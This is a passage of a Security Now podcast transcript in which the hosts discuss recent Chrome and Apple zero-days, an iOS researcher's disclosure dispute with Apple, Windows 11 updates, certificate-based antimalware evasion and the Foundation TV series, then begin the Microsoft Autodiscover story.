Also we look at some additional fallout from this month's ever-exciting Patch Tuesday, and take notice of a clever new approach for bypassing antimalware checking under Windows.  And then, after a quick check-in about the first two episodes of Apple TV's "Foundation" series, we're going to settle in, as I said, to examine the week's most explosive, worrisome, and somewhat controversial disclosure of yet another huge Microsoft screw-up which caused this week's episode, as I said, to be given the domain name "Autodiscover.fiasco."



LEO:  Aw.  I love it.  All right.  We will get to all of that and, yes, a stellar Picture of the Week.  A visual pun, if you will.



STEVE:  So I don't know that I can actually describe this adequately.  It was easier to talk about messy cabling closets because people could just, you know, you had a model to go from there.  I titled this, I think sort of correctly, "A Logic Gate."  It's actually a metal gate in sort of a narrow alley.  And its vertical bars are made from beautifully crafted, I mean, this is a work of art, logic gate symbols, where for example, you know, a NAND gate or an AND gate has a shape to it.  It's got typically two inputs and an output.



Well, so there's two vertical bars going up to a beautifully rendered metal shaped AND gate, and then one bar coming out of it.  We've got inverters.  We've got some, I don't know what that thing is, it's supposed to be an OR, but it's only got one input.  So maybe it's not.  And unfortunately the balls which are used to perform the welding, they don't all have balls, so it wasn't necessary because that's the typical inversion symbol in digital logic notation.  Anyway, just I've had this in the pile of pictures for some time.  Thank you, whoever it was who tweeted.  I really appreciate this.



LEO:  Chickenhead21 says the gate looks closed, but the gates are inverse, so it's really open.  This is the ultimate logic gate.  Do you think it's actual?  It's not really an actual circuit.  I don't think it could be. 



STEVE:  No, no.  No, no, no.  No.  Well, and you can sort of see the center bar, we've got some inputs that appear out of nothing, where there's nothing actually feeding them and so forth.



LEO:  Yeah, yeah, right, right, yeah.



STEVE:  But still just, I mean, a beautiful piece of work.  So somebody had a sense of humor.



LEO:  I love this.



STEVE:  I don't, you know, what would be really cool, to know what the back story is, like, okay, where did this come from?



LEO:  Yeah, that's a lot of work, yeah.



STEVE:  It is a lot of work, yeah.  And it's going to fall on deaf eyes.  Wait.  Deaf ears?  Blind eyes?



LEO:  Most people will look at it and have no idea.



STEVE:  They're going to go, huh?



LEO:  Yeah.



STEVE:  Yeah.



LEO:  But not this crowd.



STEVE:  Not our group.  As is the case for the news of the 12th zero-day so far this year. 



LEO:  Oh, agh.



STEVE:  We know what that is without any additional description.  Last week Chrome's emergency zero-day update, that is to say, last week when we talked about it left us at 930.0.4577.82.  But that one didn't last long.  Last Friday, Chrome was updated to 94.0.4606.61, with a fix for a single high-priority update for, yes, yet another zero-day that Google says, thus zero-day, they are aware of being exploited in the wild.  Now, one thing we're going to be hearing a lot about this week because boy are they becoming prolific, and that's Google's so-called TAG team, their Threat Analysis Group.  They're responsible for this one.  They found it in their own product.



It's being tracked as CVE-2021-37973.  It's a use-after-free, which we know means that some way was found to access memory after the garbage collector had released some memory back to the system, believing that it was no longer necessary.  There are languages where you explicitly, you the programmer, explicitly ask for and receive an allocation of memory from the operating system.  There are languages where memory is allocated statically so your program just always has it, typically within its own memory space.  And then there are so-called automatic languages where you just start to use some memory, and something underneath says, oh, and quickly creates some memory to hold your use.



And the idea is that it's supposed to figure out when you're no longer going to use that anymore because it's, depending upon what you're doing, how long this program's going to be running, the system can't just keep automatically allocating memory every time it sees that you're about to need it, without it also on the backend figuring out, okay, he's done with this now, I can let it go.  And there are many instances where, like if memory is allocated inside of a subroutine, when you exit the subroutine, the presumption is, okay, anything you had allocated while in the subroutine should not be accessible outside the subroutine due to what's known as "scoping" in languages.  So as soon as you go out of scope, then the operating system could say, okay, he's done with this, and let it go.



Anyway, it is complicated.  It's another one of those things that is a great convenience for the programmer.  And it comes at some cost to the system of providing that convenience.  And it can be a little error-prone.  So we keep seeing these use-after-free, which means that after the memory was freed, there was still some means for a malicious programmer to get access to that memory.  And who knows, I mean, the memory could be reused by the operating system, and so they'd have access to some memory that was now in use by another process.  And that's a big no-no because that breaks interprocess isolation.



So, you know, the problem is we keep finding these, yet we keep writing new code that introduces new problems.  So we're the hamster on the little wheel that is never-ending.  Anyway, the Google TAG team found the problem.  They discovered and reported the flaw to the Chromium people.  And it turns out they found it because a bad guy had found it already and was actually exploiting what I just described, tricky as that is, found a way to exploit it in the wild for their nefarious purposes.  So quick, push out a new version of Chrome, one more use-after-free problem is now gone.  Let's hope we don't see any more soon.



And, you know, Google doesn't give us any more information about this because they want everybody to update before they talk about it.  That means that it ends up becoming sort of historical interest only.  And then does anyone care anymore?  No.  So they're probably never going to tell us.  And again, no one will care.  But for those keeping score at home, this brings a total year-to-date zero-day tally for Chromium to 12.



LEO:  Wow.



STEVE:  So since we're still in month nine until next podcast, you know - and again, I give Google serious props for being as responsive as they are.  We're going to be talking about a - in fact, this podcast is named after a real mess that Microsoft has known about for some time, and as the case with the ProxyLogon Microsoft Exchange problems, and the printer nightmare problems where they've known for three months or nine months respectively and did nothing about it.  Google jumps on this stuff and gets them fixed in a matter of days.  So I'm glad that so many browsers have decided to go the Chromium route, and especially Microsoft's browser.



What was interesting was that the flaw appeared, remember I talked about how they keep writing new code, well, this is in new code.  It was in the so-called "Portals API."  And I thought, what's the Portals API?  Turns out it's a new web page navigation system that enables the user's current web page to show another page as an inset thumbnail.  And then, upon some action, maybe you click on it or you move your mouse over it or who knows what, it performs a seamless transition of that little thumbnail to become the next page by smoothly zooming the thumbnail to full size to replace its parent page and to become the new top-level document.



And I have to say, there's a bunch of examples.  If you go to web.dev/hands-on-portals, so https://web.dev/hands-on-portals, you'll see some examples of this.  And it's kind of slick since it's the sort of effect that we're used to seeing on fancy OS platform UIs.  And once it catches on, I'm sure we're going to be seeing it all over the place, often.  And maybe more than we want to since it is a bit cutesy-poo.  But, you know, as I was looking at it thinking, okay, here's another bit of eyewash for us, it's just going to make GRC look even more Stone Age than it already is.  But that's okay, too.



Once I get caught up with SpinRite, probably after 7.2, where we'll have operation on BIOS and UEFI and native support for all drive technologies, I might go for a change of pace and spend a little time on the website.  Maybe.  I have a feeling, though, that given the weird timing anomalies that we've detected with SSD reading, that that's going to be too much for me to resist, and I might just switch over to work on SpinRite 8.



Anyway, in our zero-day watch we also have Apple.  There were urgent Apple iOS and macOS updates which were just released to fix actively exploited zero-days.  The day before Google pushed out that most recent high-priority update to Chrome they were just talking about, Apple released security updates to fix multiple security vulnerabilities appearing in older versions of iOS and macOS.  Apple says, because Google told them, again this TAG group, that they've been detected in exploits in the wild, thus, yes, true zero-days.  Last Thursday's updates also expanded some earlier patches for a previously resolved vulnerability that was being abused by the NSO Group's Pegasus surveillance tool, which is used in targeted attacks on iPhone users.



The most worrisome was a type confusion flaw, another type of mistake that can again be sort of - it crops up in code where some object is referred to as being of a different type, like a string versus an integer, or a floating point value referred to as a string or something.  And that can cause all kinds of problems.  In this case, it's in a kernel component, the XNU kernel component.  And it was being exploited within a deliberately developed malicious application and used to execute arbitrary code with the highest privileges.  iOS client applications are never allowed to have kernel root privileges, which they were obtaining through this vulnerability.



And as I said, it was uncovered by Google's TAG team, which said that it had detected the vulnerability being used in conjunction with remote code execution targeting WebKit, which of course is Apple's web engine that they use in Safari and elsewhere.  The patches are available for devices running macOS Catalina and iPhone 5s, iPhone 6, 6+, iPad Air, iPad mini 2, mini 3, and iPod Touch 6th generation running iOS 12.5.4.  So this was basically fixing older versions of some of these things that turned out to also be under attack.



And speaking of Apple, back on September 9th the Washington Post ran a story titled "Apple pays hackers six figures to find bugs in its software, but then it sits on their findings."  And, you know, the implication being that they're sort of buying the silence of hackers who are responsibly reporting problems.  Thank you for paying us, but are you going to get around to fixing them?  Because this thing was subtitled "Lack of communication, confusion about payments, and long delays have security researchers fed up with Apple's bug bounty program."



Now, as I was assembling the podcast that followed that story, which was discussing the mega Meris or Meris - we were never really sure how to pronounce that - botnet, I read what the Washington Post had to say.  Basically it was grumbling from researchers over how Apple's security team was leaving bug reports unsolved for months, shipping incomplete fixes, low-balling their monetary rewards - in their opinion - or banning researchers from their program when they complained about the way Apple was treating them.



Now, so all of that is worrisome.  But I decided that it was mostly sort of generalizations that didn't have a lot of meat, like not enough for the podcast.  This week, however, we won't be asking where's the beef.  Last Thursday, a Russian security researcher named Denis Tokarev, who uses the handle "Illusion of Chaos," having finally given up waiting for Apple to acknowledge and repair three of the four vulnerabilities he had reported to them in April, published full details and proofs of concept on GitHub for three vulnerabilities that Apple had not addressed.  And that includes even with the just-released iOS 15 from earlier last week.



The three problems are:  a vulnerability in the Gamed daemon that can grant access to user data such as Apple ID emails, names, authentication tokens, and grant file system access.  I have a link in the show notes to his discussion of that and his proof of day.  Any app installed from the App Store may access, he writes, the following data without any prompt from the user:  Apple ID email and full name associated with it; Apple ID authentication token which allows to access at least one of the endpoints on *.apple.com on behalf of the user, meaning an authentication breach; complete file system read access to the Core Duet database, which contains a list of contacts from Mail, SMS, iMessage, third-party messaging apps and metadata about all user's interaction with these contacts, including timestamps and statistics and also some attachments like URLs and texts; and also complete file system read access to the Speed Dial database and the Address Book database including contact pictures and other metadata like creation and modification dates.



The researchers noted that they had just checked on iOS 15, and this last one is now inaccessible, suggesting that it was quietly fixed, although Apple had not acknowledged that to the researcher.



We also have a vulnerability in the nehelper daemon that can be used from within an app to learn what other apps are installed on the device.  So that's a breach of security we know other platforms have fixed in the past.  And an additional vulnerability in the nehelper daemon, the same one, that can also be used from within an app to gain access to a device's WiFi information.



Denis also published his proof-of-concept code for the fourth issue.  Oh, and I should mention each of those three has proof-of-concept code up on GitHub.  He also published the proof of concept for a fourth issue which affects the iOS analyticsd daemon.  This was the fourth of the bugs he reported to Apple in April and was the only one of his four issues patched, and that was in iOS 14.7, back in July.



His blog posting last Thursday was titled "Disclosure of three zero-day iOS vulnerabilities and critique of Apple Security Bounty program."  I have a link to his full posting in the show notes for anyone who wants it.  I'm just going to grab the top of it where he begins:  "I want to share my frustrating experience participating in the Apple Security Bounty program.  I've reported four zero-day vulnerabilities this year between March 10 and May 4.  As of now, three of them are still present in the latest iOS version (15.0), and one was fixed in 14.7."



Now, I'll interrupt here to note that this is a perfect example of where calling these zero-days is not correct.  They are vulnerabilities, yes.  They're not good.  No.  But what makes zero-days special, as I said before, is that they are discovered being in use in the wild.  You know, we want to have some term that gives extra oomph to vulnerabilities, and "zero-day" is that term.  Except now everyone's just using it for everything.  And, you know, if we don't require that we use them correctly, then the term is going to lose all significance, except to make them sound more scary, which isn't fair.



So anyway, he continues:  "But Apple decided to cover it up and not list it" - meaning his findings - "on the security content page.  When I confronted them, they apologized, assured me it happened due to a processing issue, and promised to list it on the security content page of the next update.  There were three releases since then, and they broke their promise each time.



"Ten days ago," he wrote, "I asked for an explanation and warned them that I would make my research public if I didn't receive an explanation.  My request was ignored, so I'm doing what I said I would.  My actions are in accordance with responsible disclosure guidelines."  And he says, parens, "(Google Project Zero discloses vulnerabilities in 90 days after reporting them to vendor; ZDI in 120.)"  He says:  "I have waited much longer, up to half a year in one case."  He says:  "I'm not the first person who is unhappy with Apple Security Bounty program.  Here are some other reports and opinions."  Whereupon he lists eight publications and three tweets, and one of the publications is iMore.  So some respected publications.  Then yesterday he blogged an article with the title "How malware gets into the App Store, and why Apple can't stop that."  Again, a link to his blog post in the notes.



He just starts out, he says:  "Only after I had published a post detailing three iOS zero-day" - okay, which aren't - "vulnerabilities and expressing my frustration with Apple's Security Bounty Program, I received a reply from Apple."  And he quotes it:  "We saw your blog post regarding the issue and your other reports.  We apologize for the delay in responding to you.  We want to let you know that we are still investigating these issues" - okay, six months later; right? - "and how we can address them to protect customers.  Thank you again for taking the time to report these issues to us.  We appreciate your assistance."  Even though they're not demonstrating any appreciation.  "Let us know if you have any questions."



And so he takes them up on it.  He says:  "Indeed, I do have questions.  The same ones that you have ignored.  I'm going to repeat them.  Why was the fix for analyticsd vulnerability quietly included in iOS 14.7 update, but not mentioned on its security content list?  Why did you promise to include it in the next update's list, but broke your words not once, but three times?  Why do you keep ignoring these questions?"



Okay.  So given that there's been a lot of coverage of this recently, I wanted to give it some attention.  I suspect we're dealing with the collision of egos and busy companies.  Researchers doubtless work quite hard to find problems.  I mean, these are not easy problems to find, especially in iOS, which fights against allowing anyone to look anywhere.  And once found, they feel, the researchers feel possessive of them and want them to be acknowledged and to be fairly compensated for their work.  Which after all they are promised, you know, ahead of time.  And while the problems that Denis found and reported may not be remote code execution, information disclosure problems of the sort he detailed can be significant, especially with Apple increasingly begging us to trust them, allowing them to carry our purchasing cards and other information and to acquire real-time health data about us.



And I'd also wager that the signal-to-noise ratio among all of the reports of problems that Apple receives probably makes wading through an endless stream of non-problems, looking for true problems, annoying and fatiguing.  I get that.  This is where we are today.  But we're seeing that example after example, and boy are we going to have one at the end of the podcast, of incredibly cash-rich companies like Microsoft and Apple, not appearing to be budgeting the resources that perhaps they should.  You know, they get to a position of, like, super-strength, where nothing can touch them any longer, and then maybe inevitably it's like, eh, you know, thanks for the report.  We'll let you know maybe.  Maybe not.  Maybe we'll fix it, and maybe not.



Epik, this slimeball registrar and host, has confirmed their hack.  Last week we talked about the email I received when some GRC domain email accounts were obtained from the domain registrar and web host Epik.  At the time, Epik was denying that anything had happened.  It took them a week to acknowledge what all the evidence showed.  They finally did.  So I wanted to quickly follow up.  Threatpost's updated coverage of this quoted the CTO and cofounder of Blue Hexagon.  He explained - and this guy has nothing to do with Epik, but they quoted him to get some context for why this was happening.



And so this CTO and cofounder of Blue Hexagon was quoted by Threatpost saying:  "This has happened to a lot of the right-wing outlets, Parler and Gab for example, because they have been brought up in record time to capitalize on current events like the election, vaccines, voting, and deplatforming to be able to fundraise or get traction quickly."



He said:  "Unfortunately, this usually means that security takes a backseat due to business pressure."  Right?  It's like, hey, get us a website.  Get us online.  And as we know, security takes extra effort.  So it's not surprising that security is lagging and lacking.  And he says:  "Which can result in breaches.  Usually, hacktivists are not known to be as sophisticated as nation-state groups or the big-game ransomware operators.  But nowadays a lot of tools and malware are for sale and can be used by anyone who is reasonably technically adept at penetrating networks."



And of course last week's topic was about Cobalt Strike, which is precisely that sort of out-of-the-box, turnkey, off-the-shelf hacking tool.  So that's what's going to be happening if you're in a big hurry to get yourself online; and, unfortunately, if you paint a target on yourself.  And you know, there was so much news this week I didn't have a chance to get to all of it.  But I did keep checking back in with VoIP.ms, and this attack continued.  At one point a couple days ago they thought they were back online.  And then in an updated tweet they said, oh, apparently our U.S. points of presence are back down.  And now there's yet another VoIP vendor, Bandwidth.com, which has been suffering another DDoS attack.



LEO:  And a TWiT advertiser, by the way. 



STEVE:  Oh, no kidding.



LEO:  And by the way, huge because they're the backend for Google Voice and a bunch of other stuff.  So when Bandwidth.com goes down...



STEVE:  Boy.



LEO:  Boy, this is a tough ransomware play.  You know?  I mean, geez.



STEVE:  Yeah.  Yeah. 



LEO:  It's hard to defend against this stuff.



STEVE:  Right.  As I said, when you're looking at request-based attacks, you need filters for those requests.  And nobody's built filters for VoIP requests.  And because it's a real-time technology, unlike a web query, where you can afford to kind of bounce it around a bit and make it jump through some hoops, VoIP may be a tricky protocol to protect.  And this may just be the beginning of new protocol-specific attacks that we're going to be seeing.  So, yeah, I agree with you completely, Leo.  It's going to be tricky.



Microsoft is moving forward with Windows 11, getting it closer to release.  And it's going to be October 5th is the release date, which is next Tuesday.  So that's apparently slated as Windows 11 launch date.  Up until now, the Windows Insider Release channel was only offering users Windows 10 21H2, which is their version 19044, which is expected to be released next month.  But as of last Thursday, Microsoft is now offering Windows 11 as an optional download within Windows Update for users with compatible hardware.  And as for compatible hardware, we'll be talking about that in a minute.



The Win11 build being offered in the Release channel now, as of last Thursday, is 22000.194, which is the release that became available to users in the Beta channel the previous week, on September 16th.  Even though the last few beta builds have just been feature-stable bug fixes, to me this seems pretty quick, given how flaky some of those earlier Win11 releases have been.  I know that rounding off some pointy corners and changing the look and feel of the Start Menu is no big deal.  We're going to see how this comes off.  It does sort of feel rushed.  I hope I'm wrong.



On the downside is the fact that a bunch of popular longstanding Windows features have been removed from Windows 11, which has upset many of the early users of it who are asking to have them restored.  The currently missing features include a Taskbar context menu, the ability to drag and drop files onto Taskbar applications, the ability to move the Taskbar to the top or sides of the screen, and the ability to ungroup running applications.  So it feels as though Microsoft is trying and succeeding in dumbing down the user interface.  I guess change is good; right?



But apparently I won't be needing to worry about anything changing anytime soon because they also released a newly updated PC Health Check Tool which, because I thought a lot of our listeners would probably want to have access to it and run it, you can get it at aka.ms/getpchealthcheckapp.  Or you can use my shortcut which will always be there, grc.sc/check, grc.sc slash C-H-E-C-K.  And that just redirects to the same URL.



I was somewhat excited to run it on Windows 7.  And it told me, oop, sorry, only runs on Windows 10.  So you can't use it to see if your Windows 7 machine will be able to run Windows 11.  You have to go to 10 first.  So I waited until I got to my other location yesterday evening.  And to my surprise, my super-snappy Intel NUC containing a quad core Intel i7-6770HQ running at 2.6 GHz, plenty of memory, plenty of everything else, fails to make the grade.  In the show notes I have what the PC Health Test showed.  And it said:  "This processor isn't currently supported for Windows 11."



Okay.  So anyway, I wouldn't probably have wanted to use it anyway because I'm using one of those big curved Dell kind of semi-wraparound screens that's extremely wide.  And so I run my Windows Taskbar on the left edge of this very wide panel in order to get all of the vertical space that I can.  There's no reason to have the Taskbar taking up space from all of the apps.  And you can't do that under Windows 11 because, you know, they made it better.  So I'll be sticking with Windows 10.  For anyone who wants to see what Microsoft's latest is, however, grc.sc/check.



So it turns out that the failed network printing troubles we covered last week were not the only problems caused by September's Patch Tuesday.  Microsoft has stated that users may experience app freezes, app crashes, and the inability to launch an application.  So pretty much what an operating system is supposed to do, it might decide not to, after being made better with those updates.



Apparently, the trouble affects users who employ Microsoft's Exploit Protection Export Address Filtering, the EAF, Export Address Filtering feature.  It's used to detect dangerous operations used by malicious code or exploit modules.  Which is sort of generic-sounding.  Microsoft said that:  "After installing KB5005101 or a later update on devices using Microsoft Exploit Protection Export Address Filtering (EAF), you might have issues with some applications.  You might be experiencing this issue if apps fail to open, fail to open files, or you might receive a white window when attempting to log in."



Microsoft also said:  "This issue is resolved using the Known Issue Rollback."  That's something new, KIR, the Known Issue Rollback.  They said:  "Please note that it might take up to 24 hours for the resolution to propagate automatically to consumer devices and non-managed business devices.  Restarting your Windows device might help the resolution apply to your device faster."  You know, the terms "might" and "maybe" are what you get once all of the actual science has been removed from the computer science.  Yes...



LEO:  It's just computer now.



STEVE:  We don't know.  Yeah, you might, you know, you might try this. 



LEO:  Give it a shot.  Give it a shot.



STEVE:  You might try that.  Maybe it'll work.  Yeah.  You know?  But hopefully, I was thinking, by now, two weeks after this month's exciting Patch Tuesday, all of the "mights" and "maybes" will have had the chance to work themselves out, and things will be working again for everyone, just in time for next month's Patch Tuesday adventure.  Stay tuned.  Maybe.



Okay.  So okay.  This is under the category of "This is just too clever to believe."  Google's increasingly prolific TAG team has spotted and reported a diabolically clever new scheme being used by malware to avoid detection by third-party antimalware tools running on Windows.  The attackers figured out a way to create a malformed code-signing certificate which would be seen and treated as valid by Windows, thus allowing the code to run without any trouble and with reduced scrutiny because, after all, it has a code-signing certificate, while at the same time being undecodable and thus unchecked by third-party antimalware systems which almost universally use the OpenSSL codebase to perform their various crypto operations.  That's just too clever.



So Windows likes it, but third-party antimalware, which uses OpenSSL, hits a tiny little glitch in the parsing of the certificate that causes it to go, oh, well, this is invalid, and to stop further checking.  This new technique was observed being exploited by a notorious family of unwanted software known as OpenSUpdater.  It's used to download and install other suspicious programs on compromised systems.  Most targets of this campaign are users located in the U.S. who are prone to downloading cracked versions of games and other sort of grey-area software.



And while adversaries have previously relied upon illegally obtained digital certs, and we've talked about this for years, it's uncommon, but it happens, to sneak adware and other unwanted software past malware detection tools - because again, as I said, if you have a valid cert, it kind of gives a little bit of a green light - or they've also embedded the attack code into digitally signed, trusted software components by poisoning the software supply chain, OpenSUpdater stands out for its intentional use of malformed signatures to slip through defenses.  And again, I don't often give bad guys a tip of the hat, but that's just pretty clever.  Leo?



LEO:  Steve?



STEVE:  I'm not going to give Apple a tip of the hat.



LEO:  Oh.



STEVE:  I titled this little piece "A Shaky Foundation."



LEO:  I made Lisa watch both episodes because I said, "Steve's going to talk about it on Tuesday.  I have to be ready for this."



STEVE:  Okay.  So before I describe that I think so far about Apple's "Foundation" series - although I've already sort of tipped off our listeners, yeah.



LEO:  Shaky, that's the word, yeah.



STEVE:  I wanted to share two paragraphs from Mashable's context-setting posting.  And there will be no spoilers anywhere.



LEO:  No, no.



STEVE:  In any of this discussion.  We don't do that.



LEO:  We don't do that.



STEVE:  But Mashable did prepare me, because I read this beforehand, they said:  "An adaptation of Isaac Asimov's classic science fiction novels, 'Foundation' is less interested in following its source material to the letter than it is in creating a story within Asimov's universe that would make good TV."  And unfortunately I'm not sure I agree with even that.  They said:  "The basic plot remains the same:  Mathematician Hari Seldon, played by Jared Harris, foretells the fall of the Galactic Empire, thanks to his theory of psychohistory.  Knowing the fall is inevitable," you know, because he's a mathematician and he computes it, "he establishes the Foundation in order to preserve knowledge and, hopefully, civilization in the years to come."



Kind of a cool concept; right?  It's like, oh, you're convinced this thousands of years sophisticated Galactic Empire is going to, like, fall into Dark Ages.  You want to preserve the knowledge.  So you create this Foundation for that purpose, to shorten the fall.  They continue.



"'Foundation' takes this story and tweaks it in some pretty big ways, which makes sense when considering the scale of Asimov's work.  The Foundation books are collections of interlocking stories and novellas whose events span hundreds of years, not to mention an entire galaxy.  Characters who appear in one story may be long dead in the next, and so much happens in between stories that we never fully 'see' on the page."  So they finish.  "These elements make creating a completely faithful TV show rather challenging, which explains several of showrunner David S. Goyer's choices to deviate from the books."



Okay.  So my own take is that, so far, it has definitely not been amazing.  So naturally it feels to me like an expensive lost opportunity.  "Foundation" has often been called the story that's impossible to bring to the screen, and so far I think we're seeing this play out.  There are several problems that I've seen.  I'll point out a few.  For one, I think the series is having a problem with pacing.  It seems to swing between moving quickly and moving slowly.



And Leo, we discussed this before, and I was surprised but pleased to hear that apparently everybody is saying the same thing.  One of my biggest complaints is that the dialogue soundtrack is often muddy and unintelligible.  The very first scene of the series has four young friends playing outdoors, bundled up against the cold.  They're talking meaningfully, like it's important.  Yet what they're saying is unintelligible.  I paused, backed up, turned up the volume, and still all I heard was "blub blub blub blub."  And it seems so inconsiderate of the audience, and I wonder how difficult it could be in this day and age not to have everyone appropriately mic'd up and articulating their lines clearly.  You know, and we could just agree that that's something everyone does in the far future, is like articulation has become a thing.



And unfortunately this continued intermittently throughout the two hours, with major characters mumbling to each other, where we're clearly supposed to be listening and obtaining information.  And I get it that there's a sense of it being more real and realistic if someone turns to someone standing next to them and mumbles to them.  But if we're not supposed to hear what's said, then just give the other person a meaningful look and not leave us pissed off that we don't - because we really, we're trying to care about this; right?



And the other thing, it's really interesting, and you experienced the same thing, you said, Leo, Lorrie and I were unable, I mean, much of a sci-fi fan as I am, I mean, we never stopped watching "Stranger Things."  It was like, you know, 3:00 a.m. and Lorrie said, looked at me, "Can we do one more?"  Okay, we were unable to watch both episodes of "Foundation" back to back because there's something heavy and oppressive about it.  It's not the story.  It's the feel.  We felt somewhat drained and exhausted after each hour.  And maybe it was just from straining to hear what was being said.  But whatever it was, an hour of this was a lot.



And speaking of straining, what the heck happened at the end of the second episode?  I mean, WTF?  I had to go online the next day...



LEO:  You're supposed to say that, and tune in to Episode 3.



STEVE:  Oh, my god.  I had to, like, read speculation.  And thank god it wasn't just me.



LEO:  Oh, just hang with it.



STEVE:  Nobody had any idea.



LEO:  No, it's called a cliffhanger.



STEVE:  It's called bad.  Oh.



LEO:  Okay.  It didn't bother me.  I knew there was something up.  You know.  Well, we'll find out next week.  It's a little frustrating because they only did two episodes in the first week.  Now we have to watch week to week, which I've never been a fan of.



STEVE:  Yeah.  And if they wanted it to be a cliffhanger, they should have hung us off that cliff about five minutes sooner.  I can't say what happened.  I won't spoil anything for anybody.  But...



LEO:  It's a shocker.  It's a big, big, big twist.  And I have some speculation.  I didn't read any of the articles about it.  But I have some thoughts about it.



STEVE:  I read the articles.  I think they're right.  And it puts into context an argument that was had a little earlier over a meal.  And it's like, okay.



LEO:  That's right.  That's what I thought.  Okay, good.  That confirms my - I said to Lisa, I said, they were setting us up a little earlier, yeah.



STEVE:  Yup.  Yup.  So anyway, sorry that we don't have another "Expanse," and we don't have another "Stranger Things," something that's like really fun.



LEO:  And I'm going to tell you my opinion, which is I couldn't finish "The Expanse."  I keep trying.  I'm actually really enjoying "Foundation."  So people should give it a try.



STEVE:  Good, good, good, good.  Yeah, don't be - I would maybe wait a little longer before subscribing to Apple TV Plus if you don't...



LEO:  That's the problem, you've got to pay to see it.



STEVE:  Yes, yes.  And based on the previews, I found myself thinking, you know, next month maybe just a straight-up guns-blazing alien invasion series is going to be fun because that's coming...



LEO:  You like, let's be fair, because your taste in science fiction tends to this as well, you like combat.  You like space combat.  And this didn't have a lot of...



STEVE:  But I'm a big Star Trek fan.  And it was all about social situations and people.  And we had our phasers.



LEO:  The thing that was very interesting to me, and I mentioned this to Lisa, is to remember this predates pretty much all of the Star Trek-style stuff.  This is from the '50s.  And Star Trek was very influenced by it.  You know, there's - she said, well, that's straight out of Star Trek.  I said, no, no, Star Trek is straight out of that.



STEVE:  Yes.



LEO:  And so that's a good reason.  You know, I hadn't read it in so long that I wasn't too worried about it not following the actual novel.



STEVE:  Oh, and I don't care at all.



LEO:  I understand the problem of making it, you know.



STEVE:  It doesn't have to - yes, yes.  It doesn't, in no way does it have to follow the plot.  You know, "Arrival" was like, just curled our toes.



LEO:  Right.  Great, a great movie.



STEVE:  Loved, loved, loved that.



LEO:  I agree with you on the sound.  Scott Wilkinson also brought that up, that the sound was a little muddy.  I think these 5.1 Dolby, and Apple especially because they're really all in on spatial, these things really are starting to require Dolby Atmos systems.  And you know what I do, because I do have a 5.1 surround system, if you have that capability, to boost the center channel.  That in the past has solved a lot of these kind of muddy dialogue problems for me.  I didn't have too much trouble.  The other thing us old folks often do, we just turn on the closed captioning and read along.



STEVE:  Hey, does that work?



LEO:  Oh, hey, yeah.  Oh, are you kidding?  In fact, here's a really nice tip on the Apple TV.



STEVE:  I think you've just saved it for me, Leo.



LEO:  Yeah.  If you press the Siri button, and you say "What did she just say?"  I'm not kidding, it's the best feature of the Apple TV.  It skips back 30 seconds, turns on captions, plays the same thing over again, and then goes back to normal.  Try that.  "What did those kids just say?  What are they talking about?"  It's a great feature.



STEVE:  That's kind of cool.



LEO:  It's a great feature.  I love it.  I do it.



STEVE:  Get off my lawn.



LEO:  It is, I do it all the time.  I do it all the time.  I was, you know, we watched the first episode on our 4K HDR screen, and it's beautiful, with stereo speakers.  And that was easy.



STEVE:  Oh, Leo.  Visually...



LEO:  It's visually gorgeous.



STEVE:  Yes, visually.  And for what it's worth we are going to apparently be getting some big space battles, which is okay, you know.



LEO:  I'm wondering, if it's CGI, I'm wondering how they did it, if they're doing a Mandalorian-style LED screen, or how much of it's practical effect.  I'm very curious as to - I want to see when they release "The Making of Foundation."



STEVE:  The sets are beautiful.



LEO:  It really is beautiful, yeah, yeah.  And very powerful, you know, that's - well, I don't want to go into it because we don't want any spoilers.



STEVE:  No spoilers.  In order not to break this last topic, let's take our last break now.



LEO:  Good idea.  Good idea.  Now's a good time.



STEVE:  And then we're going to talk about, oh, boy.  For those who are not familiar with the term "fiasco," it's a particular favorite of mine.  It's defined as a thing that is a complete failure, especially in a ludicrous or humiliating way.  Thus...



LEO:  It's a good Italian word.



STEVE:  Auto fiasco.  And you know, Leo, when I was looking up the definition, I found that there's an Italian restaurant named Fiasco.  And I thought, you know, I'm not sure that I'd want to eat at Fiasco.



LEO:  The only extra thing I'd add to that is there's a - I don't know if you're familiar with the show and podcast "This American Life," which is a wonderful one.  Probably, if you've never listened to any of "This American Life," find the episode called "Fiasco" and listen to it because it's a series, it's stories about a series of different kinds of fiascos.  And it is among the funniest things I've ever heard.  It is really, really good.  If you want a good definition of "fiasco."  On we go with the show and the Fiasco of the Week.  I think we should have a whole feature:  The Fiasco of the Week.  There's plenty of them.



STEVE:  Just love that word.  I love the way it feels.



LEO:  Fiasco.  Italians know how to do it.  They really do.



STEVE:  Okay.  So a recurring problem in security occurs when attempts are made to make complex and secure things less complex.  It's often the case that they also become less secure.  A classic example was the creation of Universal Plug and Play,  which defined, as we know, a means for essentially bypassing the crucially important firewall protection being created by NAT routers.  Why?  Because those pesky NAT routers were getting in the way, exactly as they were designed to and as any savvy user wanted them to.  So Microsoft and Intel defined an entirely unauthenticated protocol by which any device on the LAN could map external traffic through to bypass NAT protections.



That was bad enough, since attackers figured out how to get our fancy web browsers inside the LAN to send UPnP requests to the LAN's NAT router on behalf of the attackers, thus allowing the attackers right into the network.  Couple that with the fact that mistakes are invariably made, and we saw many routers which mistakenly also bound their UPnP service to the WAN interface.  I immediately, as our listeners will recall, I think it was Episode 300 and something, added a test for that to ShieldsUP!.  That was 55,145 positive tests ago.  And that number should be zero.  But no.



Now, UPnP is not today's topic, but it serves as a prime example of the absolute sacrifice of security in the name of convenience.  And that is the moral of today's topic.  You take a bad and fundamentally flawed idea, mix in the inevitability of human error and even, if you can believe it, hubris, and what you get is Microsoft today frantically contacting domain registrars across the world to preemptively register hundreds, if not thousands, of domains in every TLD before the bad guys can get them.  What?  What is this about?



Okay.  The original idea here was to make it much easier for users to configure their email clients without any need to bother with all those pesky email setup ideas, you know, all those details, you know, things like the server's full domain name, which port to connect to, and what sorts of authentication is supported and so on.  The idea is that the user would only need to provide what they know, their email address and their password.  Then the email client would use that email domain as a starting point and emit a series of HTTP, and later HTTPS, queries, searching for a server that would answer that query and thus provide the needed configuration information.



The trouble was that domain names themselves are not well formed.  Sometimes the user's email might be @example.com, and sometimes @mail.example.com, and perhaps @mail.example.co.uk.  And in what Microsoft refers to as "configuration resiliency" - you really can't make this up - they encourage clients to try everything, to throw everything at the wall to see what might stick. 



